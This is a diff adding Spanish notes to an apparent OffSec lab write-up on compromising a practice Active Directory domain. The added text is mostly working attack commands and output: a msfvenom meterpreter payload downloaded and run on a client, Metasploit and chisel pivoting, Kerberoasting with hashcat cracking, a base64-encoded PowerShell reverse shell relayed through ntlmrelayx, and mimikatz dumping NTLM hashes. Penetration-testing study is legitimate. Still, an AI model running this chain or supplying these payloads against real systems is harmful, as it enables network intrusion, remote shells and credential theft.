@@ -545,7 +545,19 @@ SMB         192.168.234.242 445    MAILSRV1         IPC$            READ        
 
 #### Acceso a la red interna: phishing
 
-> Preparamos nuestros archivos config.Library-ms, automatic-configuration.lnk con los correspondientes payloads en el servidor webdav y servimos powercat.ps1
+> Preparamos nuestros archivos config.Library-ms, automatic-configuration.lnk con los correspondientes **payloads en el servidor webdav** y servimos **powercat.ps1 con python en el puerto 8000**
+
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
+└─# wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/OffSec/27-Assembling-The-Pieces/WINPREP
+...
+
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
+└─# python3 -m http.server 8000
+...
+```
+
+* Ejecutamos el mail
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
@@ -757,9 +769,1061 @@ Starting Neo4j.
 2025-06-22 23:38:02.325+0000 INFO  Started.                                                                                                       
 ```
 
+#### Obtenemos IP de INTERNALSRV1.BEYOND.COM
 
+```powershell
+PS C:\Users\marcus> nslookup INTERNALSRV1.BEYOND.COM
+nslookup INTERNALSRV1.BEYOND.COM
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  172.16.145.240
+
+Name:    INTERNALSRV1.BEYOND.COM
+Address:  172.16.145.241
+```
+#### Enumeracion con Bloodhound:
+
+* Querys utilizadas
+```bash
+
+
+```
+#### Configuracion pivote MSF
+
+1. **msfvenom**
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
+└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.213 LPORT=443 -f exe -o met.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: met.exe
+```
+2. **CLIENTWK1**
+
+```powerview
+PS C:\Users\marcus> iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.e
+iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe
+PS C:\Users\marcus> Start-Process .\met.exe
+.\met.exe
+PS C:\Users\marcus> 
+```
+
+3. **MFSconsole**
+
+```bash
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 192.168.45.213
+LHOST => 192.168.45.213
+msf6 exploit(multi/handler) > set LPORT 443
+LPORT => 443
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.45.213:443 
+[*] Sending stage (203846 bytes) to 192.168.189.242
+[*] Meterpreter session 1 opened (192.168.45.213:443 -> 192.168.189.242:64516) at 2025-06-23 20:04:38 -0300
+whoami
+background
+^C[-] Exploit failed [user-interrupt]: Interrupt 
+[-] run: Interrupted
+msf6 exploit(multi/handler) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                Connection
+  --  ----  ----                     -----------                ----------
+  1         meterpreter x64/windows  BEYOND\marcus @ CLIENTWK1  192.168.45.213:443 -> 192.168.189.242:64516 (192.168.189.242)
+
+msf6 exploit(multi/handler) > use multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set session 1
+session => 1
+msf6 post(multi/manage/autoroute) > run
+[*] Running module against CLIENTWK1
+[*] Searching for subnets to autoroute.
+[+] Route added to subnet 172.16.145.0/255.255.255.0 from host's routing table.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf6 auxiliary(server/socks_proxy) > set VERSION 5
+VERSION => 5
+msf6 auxiliary(server/socks_proxy) > run -j
+[*] Auxiliary module running as background job 0.
+msf6 auxiliary(server/socks_proxy) > 
+[*] Starting the SOCKS proxy server
+```
+
+#### Enumeramos la red-interna
+
+1. **SMB**
+
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
+└─# proxychains -q crackmapexec smb 172.16.145.240-241 172.16.145.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
+SMB         172.16.145.240  445    DCSRV1           [*] Windows Server 2022 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
+SMB         172.16.145.241  445    INTERNALSRV1     [*] Windows Server 2022 Build 20348 x64 (name:INTERNALSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         172.16.145.254  445    MAILSRV1         [*] Windows Server 2022 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
+SMB         172.16.145.240  445    DCSRV1           [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.145.241  445    INTERNALSRV1     [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.145.241  445    INTERNALSRV1     [+] Enumerated shares
+SMB         172.16.145.241  445    INTERNALSRV1     Share           Permissions     Remark
+SMB         172.16.145.241  445    INTERNALSRV1     -----           -----------     ------
+SMB         172.16.145.241  445    INTERNALSRV1     ADMIN$                          Remote Admin
+SMB         172.16.145.241  445    INTERNALSRV1     C$                              Default share
+SMB         172.16.145.241  445    INTERNALSRV1     IPC$            READ            Remote IPC
+SMB         172.16.145.254  445    MAILSRV1         [+] beyond.com\john:dqsTwTpZPn#nL 
+SMB         172.16.145.240  445    DCSRV1           [+] Enumerated shares
+SMB         172.16.145.240  445    DCSRV1           Share           Permissions     Remark
+SMB         172.16.145.240  445    DCSRV1           -----           -----------     ------
+SMB         172.16.145.240  445    DCSRV1           ADMIN$                          Remote Admin
+SMB         172.16.145.240  445    DCSRV1           C$                              Default share
+SMB         172.16.145.240  445    DCSRV1           IPC$            READ            Remote IPC
+SMB         172.16.145.240  445    DCSRV1           NETLOGON        READ            Logon server share 
+SMB         172.16.145.240  445    DCSRV1           SYSVOL          READ            Logon server share 
+SMB         172.16.145.254  445    MAILSRV1         [+] Enumerated shares
+SMB         172.16.145.254  445    MAILSRV1         Share           Permissions     Remark
+SMB         172.16.145.254  445    MAILSRV1         -----           -----------     ------
+SMB         172.16.145.254  445    MAILSRV1         ADMIN$                          Remote Admin
+SMB         172.16.145.254  445    MAILSRV1         C$                              Default share
+SMB         172.16.145.254  445    MAILSRV1         IPC$            READ            Remote IPC
+```
+2. **Servicios**
+
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
+└─# proxychains -q nmap -sT -oN nmap_servers -Pn -p 21,80,443 172.16.145.240 172.16.145.241 172.16.145.254
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 21:30 -03
+Nmap scan report for 172.16.145.240
+Host is up (2.4s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  closed http
+443/tcp closed https
+
+Nmap scan report for 172.16.145.241
+Host is up (1.9s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp open   https
+
+Nmap scan report for 172.16.145.254
+Host is up (2.1s latency).
+
+PORT    STATE  SERVICE
+21/tcp  closed ftp
+80/tcp  open   http
+443/tcp closed https
+
+Nmap done: 3 IP addresses (3 hosts up) scanned in 21.95 seconds
+```
+### 27.5. Ataque a una aplicación web interna
+
+#### chisel:
+
+1. Server
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# chisel server -p 8080 --reverse
+2025/06/23 21:59:53 server: Reverse tunnelling enabled
+2025/06/23 21:59:53 server: Fingerprint QKGaUWe4lYgs7w/nZ4gQW+nxlw2wh5EQ5VUlvRca5gM=
+2025/06/23 21:59:53 server: Listening on http://0.0.0.0:9999
+2025/06/23 22:13:16 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
+2025/06/23 22:13:16 server: session#1: tun: proxy#R:80=>172.16.145.241:80: Listening
+```
+
+2. Client
+ 
+```powershell
+PS C:\users\marcus> Start-Process .\chisel.exe -ArgumentList "client 192.168.45.213:8080 R:80:172.16.xxx.241:80"
+Start-Process .\chisel.exe -ArgumentList "client 192.168.45.213:8080 R:1080:socks"
+```
+
+3. Obtenemos el TGS a traves de SPNs
+
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
+└─# proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.151.240 beyond.com/john                         
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon                   Delega
+----------------------------  -------  --------  --------------------------  --------------------------  ------
+http/internalsrv1.beyond.com  daniela            2022-09-29 05:17:20.062328  2022-10-05 04:59:48.376728        
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$ff464c6c31502b025a8d9e48ef733ab5$36c3a818ac8f19d713e9f0fa043a40716cbfa86216ee5c656670be15bc1acb44461c321d55d3f50b59b9baf897c33415d3fc475f3c14af65fd3db14c4203215b69ed679de5fa32a6855b849b34d43f779c663e8822c03a1bb0f6e29f6976ac92572ecbeb36d7b4eb8f07dc6a1135a5776955f93e0c67f5e02df589cc2ecf6f169739e155ac79cf1c493aa490259a9bc4e0bde9cb51952b983dff71caaf2ded9d7099d2cbd54c4f0aca9b1debad10fd23a864d841c5810a6e8d9c33759da9811c56867276e750a34eeebf102b3385b3401b0528e57249286c3e44ee463ad5f58a17fa545a9be60430652a9f344258ca65dc9eeb7528d70b5bed20a5aa1cffb2ee2c1b9cce97e80f9d5f1e3ed1bb6d935b86a65ef679184a8a3c1ff836b955034c66ca227756acf03a06792f256ae593dfc9d7e1870882a2fdf9c3fb9f7152bf81acc9ec70c1282e7ea6784282a3a730393509bcb60f8b879fffbdede5400c087343ce2e2ddb24cd4e2e43721fe31714569748fde80adf0823d8d73b4d502954b5653e4fe94ffced7a7bb50e12376b9064e335de282d6dcec90b4cf18f12c483e5b14cd17785693f98e7acc531c6132776f239fa539ea9e1cae112d345266f38ba1363423f1973511ad911f9ebb808e967c275b61b27c201e3033f9776bebf3df22b6d8f1a120b4ee79029d3b60cf6d00b33e2044cadd9d94da1a1403c25ea14a383d28dfba0526bac648434a495a027b31e5d1ff279877dfc0162b136d5e038eb51077090fdae0ff6fad6dd911766b2724fdc0ab013507f41d9d6af22eb69f4b0e89cb613deaecb26a7bdf41ddf35b557a3ace0cd8b5bd07b519286648a0df558a7fef0126ea4f8604bb916f13c4dc811cdcf2e7164504559cf52c9f239d30eba66906d6cd0ae3e6a4cf72b40dfb4646391d741014bd220dca083f6ef4726ce7b41ceec4d5a8ea91791fd7f0971493880d09193c8b671fbc04699c48623f59d38ef390174a139a87a8c6bb1e42387a81708f630509c8bef1fc06d166
+```
+
+4. Guardamos el hash y lo crackeamos:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
+└─# hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 14879/29823 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?                 
+
+* Append -O to the commandline.
+  This lowers the maximum supported password/salt length (usually down to 32).
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+$krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$726f7d21ca918c38645b1c967177d360$98a5bbaf85b3a3289c9caa427ed2c41dc2dc5ad2618a195b3bd22f66ca45174835105fb70010ce47ce288f52c9ef1cea05ba2dc1d3960a4077fe6d429e80257fcf0d322c2291090923ec0f0ed460bc626befdced9af20075cf4447a3b8d13e2909514a41507cfd8dc896e3ef3a2e7b99135519ac9c569b5ff02e3a24f8916da433eb279257a493c8c8e21bed47cecc25e26ff5197cf3b34a5705adca8b192668966a96b478f9f05230cc13802a627b39e812be74c2b16942b01afeba1d266bf29c2d8dcdb36577b1c9cd13115b7af361000717f20c7300daf0a31b3e71c16933b67ea573b51dc901758515ace1b08f21ea2fe5e224da7882c4bb15934485064bd6549bc06f6c8c577e0fafda73d4887fdff1a8e93fd14f87c44a015e2fbdd967b8b96de870bbb6a9d10585c2ddba37d55535a358cced5eb83d157a538c0b09fd4878c7d9c4011b8c9a21da776325fcf5bceed7b81bebec67e6afe521b6860c4a743e2684241417b741a026c42e6c47333b1414c4cf44f7ac1c2a3cf9eda17cb104f2855c1d9d127902a2ae9671b8ae2c6e4624509455428277a54ce3207e8ee05d8b94061ee14e1788428fcd70603da673e97384ee293d177294517bbdc2b5b1ee42ff0998847b144c2a9e77ccc107199c04553e53dba0d202d1b9b38cde4385c65399fc6db69d8b77e34d75766d9c104e180aaf29db9ccdc14689dc42819343ba0f1d2158ad007c7d39cd08293f3a459d701757f48aad997ae2472c6054dcbb63b18f8d47e145d83c6b460d4a6d8f072ccf1c9724c9724873dfc8586b2857c1bdd4f3367f73c1aa5998dbb365ad42435d28e129b2891cfd4ce166fbd28b29ebd42d4034818891bde141e62dd7666b2b33ee260a9f803291cceb788be3185faf7e58473e046f8ffa54310302b3ab70e43f1dde0b1b1a1b92735a234d5698b366aa7133720d180e6c7c74f2fdedf17cdae05900b0e015e2970f13e0d192e02289e8bf0d5384c6b03c8395bc15bbb55ca43ac34037b337e717a0e860f10ea78230ea93acb713bc2bd8395fe3009907dece4bbd875c61607b8f8b436eba66c5f52add2dd4c33cd1907fa032b2bce069ceee2f4652e49b4473856a2b9c93942f8a0802f9ac5dcd79eae99fe2363df3ddd61c20f386f47bf0466982f9e90311a0487f7d415d22f65f7df38293fae2d894753a23c2137471ecf8b66950f54f52f73192d326631b5a8df2de1b4d6c2f812fa52b2f70a0c8a2758869d17d86b66b3c8b32653d6648ba8cef8fad52c0ec26f72f800e390b7674f6b0448237772bbb1d6c2cbca0d694281715ef20bf3c2fa4ecef7246c517f771f796b2c7439584d4a766:DANIelaRO123
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*...d4a766
+Time.Started.....: Wed Jun 25 11:34:18 2025, (15 secs)
+Time.Estimated...: Wed Jun 25 11:34:33 2025, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   751.4 kH/s (8.42ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 11272192/14344385 (78.58%)
+Rejected.........: 0/11272192 (0.00%)
+Restore.Point....: 11264000/14344385 (78.53%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: DEANNA5 -> DALDRICK16
+Hardware.Mon.#1..: Temp: 53c Util: 85%
+
+Started: Wed Jun 25 11:34:16 2025
+Stopped: Wed Jun 25 11:34:35 2025
+```
+> Obtenemos la credencial del sitio wordpres **DANIelaRO123**
+
+* Con el domino agregado en nuestro /etc/hosts 127.0.0.1 internalsrv1.beyond.com navegamos a **http://internalsrv1.beyond.com/wordpress/wp-admin/** e iniciamos sesion como **daniela**
+
+- Ejecucion de vector 1:
+1. payload.ps1 nano payload.ps1
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+```
+2. Codificacion a base64:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/MAILSRV1]
+└─# iconv -f utf-8 -t utf-16le payload.ps1 | base64 -w0
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQAKAA==
+```
+3. Ejecutamos impacket:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
+└─# impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.231.242 -c "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAwACwAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQAKAA=="
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server on port 445
+[*] Setting up WCF Server on port 9389
+[*] Setting up RAW Server on port 6666
+[*] Multirelay disabled
+
+[*] Servers started, waiting for connections
+```
+4. Cambiamos la url del backup en wordpres a `//192.168.45.213/test` y hacemos click en `save`
+5. En nuestro receptor:
+```bash
+┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
+└─# nc -lvnp 9999                     
+listening on [any] 9999 ...
+connect to [192.168.45.213] from (UNKNOWN) [192.168.231.242] 52340
+whoami
+nt authority\system
+PS C:\Windows\system32> whoami 
+nt authority\system
+PS C:\Windows\system32> hostname
+MAILSRV1
+PS C:\Windows\system32> iwr -uri http://192.168.45.213:8000/met.exe -Outfile met.exe
+PS C:\Windows\system32> Start-Process .\met.exe
+PS C:\Windows\system32> cd C:\Users\Administrator
+PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimikatz.exe
+PS C:\Users\Administrator> .\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 604274 (00000000:00093872)
+Session           : Batch from 0
+User Name         : Administrator
+Domain            : MAILSRV1
+Logon Server      : MAILSRV1
+Logon Time        : 5/3/2025 12:31:16 PM
+SID               : S-1-5-21-3952879524-1180826585-1433334954-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : MAILSRV1
+         * NTLM     : 76821e8eeb84c0ec6446dbcc40ee2c99
+         * SHA1     : d8dab7e916059ea33c6cf05fbbf007122ff32c75
+        tspkg :
+        wdigest :
+         * Username : Administrator
+         * Domain   : MAILSRV1
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : MAILSRV1
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 577229 (00000000:0008cecd)
+Session           : Service from 0
+User Name         : MSSQL$MICROSOFT##WID
+Domain            : NT SERVICE
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:31:14 PM
+SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-3769537534
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 3abb3b4f791b35ac1103b8ad26ff3490
+         * SHA1     : 0be9fd45e3db79440a750253a38429c459b8edd6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : MAILSRV1$
+         * Domain   : beyond.com
+         * Password : d7 dd 51 d9 59 50 8f 44 4d b4 88 bc 8e cc bf 33 d1 1e e1 6b c1 7f 94 14 08 81 bf cf 80 ca 31 0e db d6 97 d6 6a ac 65 09 4a 65 f0 0a 25 0c fd 29 dd 91 24 7b 94 04 79 d4 45 b7 b0 37 7a 3f 77 f9 7f 1a 3c 64 25 45 1f 2e 67 f8 82 2b 7c a0 68 06 42 ba 8e 49 94 35 b7 c1 e6 a7 1b 7c b5 a9 54 b9 73 2b f8 6d 7a b1 d8 fd b3 d3 c4 43 db 96 ad ce 99 ef b9 79 a6 2c 9f 32 e6 58 ea 06 0c 3d 85 38 95 03 b1 cc 02 39 7f 0e 0d b0 1d d9 5a 0a a4 86 f1 ab f2 13 6c c4 81 aa 54 04 3c d2 e1 39 50 ca 78 68 91 df f1 1f 49 35 56 7d ae 54 f4 54 c4 ce 96 67 5b 46 43 90 d0 f4 cb 11 0f 4d 2b 9e 3a b6 a7 06 58 dc 53 7e 9a 57 70 13 30 cc 07 cf f3 70 e2 5a f3 a3 50 85 32 2f d6 37 f5 90 5d 8d 3d 17 02 18 df 16 95 e6 10 99 6b f7 1d 00 5f d3 40 b3 
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 310592 (00000000:0004bd40)
+Session           : Interactive from 1
+User Name         : beccy
+Domain            : BEYOND
+Logon Server      : DCSRV1
+Logon Time        : 5/3/2025 12:29:28 PM
+SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
+        msv :
+         [00000003] Primary
+         * Username : beccy
+         * Domain   : BEYOND
+         * NTLM     : f0397ec5af49971f6efbdb07877046b3
+         * SHA1     : 2d878614fb421517452fd99a3e2c52dee443c8cc
+         * DPAPI    : 4aea2aa4fa4955d5093d5f14aa007c56
+        tspkg :
+        wdigest :
+         * Username : beccy
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : beccy
+         * Domain   : BEYOND.COM
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :
+
+Authentication Id : 0 ; 80982 (00000000:00013c56)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 5/3/2025 12:29:02 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * NTLM     : 5e7c4434c6f8698e1368ec7993ff7014
+         * SHA1     : 3545f6e2854628623020108a801f7caf8003e0a6
+        tspkg :
+        wdigest :
+         * Username : MAILSRV1$
+         * Domain   : BEYOND
+         * Password : (null)
+        kerberos :
+         * Username : MAILSRV1$
+         * Domain   : beyond.com
